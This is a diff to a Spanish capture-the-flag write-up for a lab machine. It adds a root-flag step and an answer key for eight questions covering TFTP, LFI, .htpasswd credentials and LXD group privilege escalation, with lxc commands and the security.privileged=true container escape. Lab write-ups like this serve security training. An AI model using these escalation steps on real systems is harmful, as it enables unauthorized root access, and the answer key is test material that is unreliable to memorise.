@@ -118,7 +118,7 @@ wget http://10.10.16.35:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
 
 <figure><img src="../../../.gitbook/assets/image (1217).png" alt=""><figcaption></figcaption></figure>
 
-Ejcutamos y creamos el contenedor para ponerlo en marcha.
+Ejecutamos y creamos el contenedor para ponerlo en marcha.
 
 ```bash
 lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias tidur
@@ -127,6 +127,54 @@ lxc start my-container
 lxc exec my-container -- /bin/sh
 ```
 
+### 5. 🔑 **Captura de la Flag**
+
 <figure><img src="../../../.gitbook/assets/Captura de pantalla 2025-02-14 112334.png" alt=""><figcaption></figcaption></figure>
 
+```bash
+ cat /root/root.txt
+```
+
 <figure><img src="../../../.gitbook/assets/Captura de pantalla 2025-02-14 112911.png" alt=""><figcaption></figcaption></figure>
+
+### 6. ❓Preguntas
+
+**Task 1:**
+
+¿Qué servicio está ejecutándose en la máquina objetivo a través de UDP?\
+**Respuesta: TFTP**
+
+**Task 2:**
+
+¿A qué clase de vulnerabilidad es susceptible la página web que está alojada en el puerto 80?\
+**Respuesta: Local File Inclusion (LFI)**
+
+**Task 3:**
+
+¿Cuál es la carpeta del sistema por defecto que TFTP usa para almacenar archivos?\
+**Respuesta: /var/lib/tftpboot/**
+
+**Task 4:**
+
+¿Qué archivo interesante se encuentra en la carpeta del servidor web y puede ser utilizado para el Movimiento Lateral?\
+**Respuesta: .htpasswd**
+
+**Task 5:**
+
+¿A qué grupo pertenece el usuario Mike y que puede ser explotado para Escalada de Privilegios?\
+**Respuesta: LXD**
+
+**Task 6:**
+
+Cuando usamos una imagen para explotar un sistema a través de contenedores, buscamos una distribución muy pequeña. Nuestra favorita para esta tarea tiene el nombre de una montaña. ¿Cuál es el nombre de esta distribución?\
+**Respuesta: Alpine**
+
+**Task 7:**
+
+¿Qué bandera debemos establecer en el contenedor para que tenga privilegios de root en el sistema host?\
+**Respuesta: security.privileged=true**
+
+**Task 8:**
+
+Si el sistema de archivos raíz está montado en /mnt en el contenedor, ¿dónde se puede encontrar la bandera raíz en el contenedor después de montar el sistema host?\
+**Respuesta: /mnt/root**
